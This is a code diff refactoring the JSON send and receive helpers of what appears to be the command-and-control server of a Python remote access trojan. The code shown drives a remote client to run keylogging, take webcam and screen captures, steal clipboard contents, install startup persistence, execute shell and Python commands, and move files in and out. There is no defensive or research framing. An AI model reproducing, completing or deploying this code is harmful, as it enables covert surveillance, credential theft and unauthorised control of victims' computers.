@@ -92,16 +92,6 @@ def _time() -> str:
     return f"{datetime.now()}".replace(':','-')
 
 
-def json_dumps(data: not bytes) -> bytes:
-    """ Dump json data and encode it """
-    return json.dumps(data).encode()
-
-
-def json_loads(data: bytes):
-    """ Decode data and json load it """
-    return json.loads(data.decode())
-
-
 class Client(object):
 
     def __init__(self, conn: socket.socket, address: list, key: bytes) -> None:
@@ -136,45 +126,53 @@ class Client(object):
         self.conn.recv(1024)
         self.conn.send(encrypted)
 
+    def send_json(self, data: not bytes) -> None:
+        """ Send JSON data to Client """
+        self.send(json.dumps(data).encode())
+
+    def recv_json(self) -> list:
+        """ Receive JSON data from Client """
+        return json.loads(self.receive().decode())
+
     def is_frozen(self) -> bool:
         """ Check if the client is frozen (exe) """
         # returns bool
-        self.send(json_dumps(['FROZEN']))
-        return json_loads(self.receive())
+        self.send_json(['FROZEN'])
+        return self.recv_json()
 
     def get_platform(self) -> str:
         """ Get Client Platform """
         # platform.system()
-        self.send(json_dumps(['PLATFORM']))
+        self.send_json(['PLATFORM'])
         return self.receive().decode()
 
     def get_cwd(self) -> str:
         """ Get Client cwd """
         # returns cwd
-        self.send(json_dumps(['GETCWD']))
+        self.send_json(['GETCWD'])
         return self.receive().decode()
 
     def clipboard(self) -> (bool, str):
         """ Get Client Clipboard """
         # returns True/False, clipboard/error
-        self.send(json_dumps(['PASTE']))
-        return tuple(json_loads(self.receive()))
+        self.send_json(['PASTE'])
+        return tuple(self.recv_json())
 
     def fill_clipboard(self, data: str) -> (bool, str):
         """ Copy to Client Clipboard"""
         # returns True/False, None/error
-        self.send(json_dumps(['COPY', data]))
-        return tuple(json_loads(self.receive()))
+        self.send_json(['COPY', data])
+        return tuple(self.recv_json())
 
     def download(self, url: str, file_name: str) -> (bool, str):
         """ Download File To Client """
         # returns True/False, None/error
-        self.send(json_dumps(['DOWNLOAD', url, file_name]))
-        return tuple(json_loads(self.receive()))
+        self.send_json(['DOWNLOAD', url, file_name])
+        return tuple(self.recv_json())
 
     def log_path(self) -> str:
         """ Get Log File Name"""
-        self.send(json_dumps(['LOG_FILE']))
+        self.send_json(['LOG_FILE'])
         return self.receive().decode()
 
     def get_log(self, save_as: str = None) -> str:
@@ -189,14 +187,14 @@ class Client(object):
     def restart_session(self) -> None:
         """ Restart Client Session """
         # returns None
-        self.send(json_dumps(['RESTART_SESSION']))
+        self.send_json(['RESTART_SESSION'])
         self.receive()
         return
 
     def disconnect(self) -> None:
         """ Disconnect Client """
         # returns None
-        self.send(json_dumps(['DISCONNECT']))
+        self.send_json(['DISCONNECT'])
         self.receive()
         self.conn.close()
         return
@@ -204,37 +202,37 @@ class Client(object):
     def add_startup(self) -> (bool, str):
         """ Add Client to Startup """
         # returns True/False, None/error
-        self.send(json_dumps(['ADD_STARTUP']))
-        return tuple(json_loads(self.receive()))
+        self.send_json(['ADD_STARTUP'])
+        return tuple(self.recv_json())
 
     def remove_startup(self) -> (bool, str):
         """ Remove Client from Startup """
         # returns True/False, None/error
-        self.send(json_dumps(['REMOVE_STARTUP']))
-        return tuple(json_loads(self.receive()))
+        self.send_json(['REMOVE_STARTUP'])
+        return tuple(self.recv_json())
 
     def lock(self) -> bool:
         """ Lock Client Machine (Windows Only) """
         # Returns bool
-        self.send(json_dumps(['LOCK']))
-        return json_loads(self.receive())
+        self.send_json(['LOCK'])
+        return self.recv_json()
 
     def shutdown(self) -> None:
         """ Shutdown Client Machine """
         # returns None
-        self.send(json_dumps(['SHUTDOWN']))
-        return json_loads(self.receive())
+        self.send_json(['SHUTDOWN'])
+        return self.recv_json()
 
     def restart(self) -> None:
         """ Restart Client Machine """
         # returns None
-        self.send(json_dumps(['RESTART']))
-        return json_loads(self.receive())
+        self.send_json(['RESTART'])
+        return self.recv_json()
 
     def send_file(self, file_to_transfer: str, save_as: str) -> None:
         """ Send file from Server to Client """
         # returns True/False, None/error
-        self.send(json_dumps(['SEND_FILE', save_as]))
+        self.send_json(['SEND_FILE', save_as])
         if self.receive() == b'FILE_TRANSFER_ERROR':
             self.send(b'RECEIVED')
             return False, self.receive().decode()
@@ -249,7 +247,7 @@ class Client(object):
     def receive_file(self, file_to_transfer: str, save_as: str) -> None:
         """ Transfer file from Client to Server """
         # returns True/False, None/error
-        self.send(json_dumps(['RECEIVE_FILE', file_to_transfer]))
+        self.send_json(['RECEIVE_FILE', file_to_transfer])
         with open(save_as, 'wb') as f:
             while 1:
                 data = self.receive()
@@ -269,7 +267,7 @@ class Client(object):
         # returns True/False, None/error
         if not save_as:
             save_as = f'{_time()}.png'
-        self.send(json_dumps(['SCREENSHOT']))
+        self.send_json(['SCREENSHOT'])
         data = self.receive()
         if data == b'ERROR':
             self.send(b'RECEIVING')
@@ -283,7 +281,7 @@ class Client(object):
         # returns True/False, save_as/None
         if not save_as:
             save_as = f'webcam-{_time()}.png'
-        self.send(json_dumps(['WEBCAM']))
+        self.send_json(['WEBCAM'])
         data = self.receive()
         if data == b'ERROR':
             return False, None
@@ -294,8 +292,8 @@ class Client(object):
     def exec(self, command: str) -> (str, str):
         """ Remote Python Interpreter """
         # returns command_output, error/None
-        self.send(json_dumps(['EXEC', command]))
-        return tuple(json_loads(self.receive()))
+        self.send_json(['EXEC', command])
+        return tuple(self.recv_json())
 
     def shell(self, command: str, _print: bool = True) -> (str, str):
         """ Remote Shell with Client """
@@ -303,8 +301,8 @@ class Client(object):
         system = self.get_platform()
         split_command = command.split(' ')[0].strip().lower()
         if split_command in ['cd', 'chdir']:
-            self.send(json_dumps(['SHELL', command]))
-            output = json.loads(self.receive().decode())
+            self.send_json(['SHELL', command])
+            output = self.recv_json()
             if output[0] == 'ERROR':
                 if _print:
                     print(output[1])
@@ -320,7 +318,7 @@ class Client(object):
         if split_command == 'clear' and system != 'Windows':
             os.system('clear')
             return ''
-        self.send(json_dumps(['SHELL', command]))
+        self.send_json(['SHELL', command])
         result = []
         while 1:
             try:
@@ -330,7 +328,7 @@ class Client(object):
                 result.append(output)
                 if _print:
                     shell_print(output)
-                self.send(json_dumps(['LISTENING']))
+                self.send_json(['LISTENING'])
             except (EOFError, KeyboardInterrupt):
                 self.send(b'QUIT')
         return result
@@ -338,20 +336,20 @@ class Client(object):
     def start_keylogger(self) -> bool:
         """ Start Keylogger """
         # returns True/False
-        self.send(json_dumps(['START_KEYLOGGER']))
-        return json_loads(self.receive())
+        self.send_json(['START_KEYLOGGER'])
+        return self.recv_json()
 
     def keylogger_status(self) -> bool:
         """ Get Keylogger Status """
         # returns True/False
-        self.send(json_dumps(['KEYLOGGER_STATUS']))
-        return json_loads(self.receive())
+        self.send_json(['KEYLOGGER_STATUS'])
+        return self.recv_json()
 
     def stop_keylogger(self) -> bool:
         """ Stop Keylogger """
         # returns True/False
-        self.send(json_dumps(['STOP_KEYLOGGER']))
-        return json_loads(self.receive())
+        self.send_json(['STOP_KEYLOGGER'])
+        return self.recv_json()
 
     def _get_info(self) -> tuple:
         """ Get Client Info """
@@ -362,13 +360,13 @@ class Client(object):
         #     getpass.getlogin()
         # )
 
-        self.send(json_dumps(['_INFO']))
-        return tuple(json_loads(self.receive()))
+        self.send_json(['_INFO'])
+        return tuple(self.recv_json())
 
     def info(self, _print: bool = True) -> str:
         """ Get Client Info """
         # returns str
-        self.send(json_dumps(['INFO']))
+        self.send_json(['INFO'])
         info = self.receive().decode()
         if _print:
             print(info)
@@ -377,20 +375,20 @@ class Client(object):
     def zip_file(self, zip_filename: str, file_to_zip: str) -> (bool, str):
         """ Zip a Single File """
         # returns True/False, None/error
-        self.send(json_dumps(['ZIP_FILE', zip_filename, file_to_zip]))
-        return tuple(json_loads(self.receive()))
+        self.send_json(['ZIP_FILE', zip_filename, file_to_zip])
+        return tuple(self.recv_json())
 
     def zip_dir(self, zip_filename: str, dir_to_zip: str) -> (bool, str):
         """ Zip a Directory """
         # returns True/False, None/error
-        self.send(json_dumps(['ZIP_DIR', os.path.splitext(zip_filename)[0], dir_to_zip]))
-        return tuple(json_loads(self.receive()))
+        self.send_json(['ZIP_DIR', os.path.splitext(zip_filename)[0], dir_to_zip])
+        return tuple(self.recv_json())
 
     def unzip(self, zip_filename: str) -> (bool, str):
         """ Unzip a File """
         # returns True/False, None/error
-        self.send(json_dumps(['UNZIP', zip_filename]))
-        return tuple(json_loads(self.receive()))
+        self.send_json(['UNZIP', zip_filename])
+        return tuple(self.recv_json())
 
 
 class MultiServer(object):
@@ -456,7 +454,7 @@ class MultiServer(object):
         clients = self.clients[:]
         for client in clients:
             try:
-                client.send(json_dumps(['LIST']))
+                client.send_json(['LIST'])
                 client.conn.recv(20480)
             except:
                 self.del_client(client)
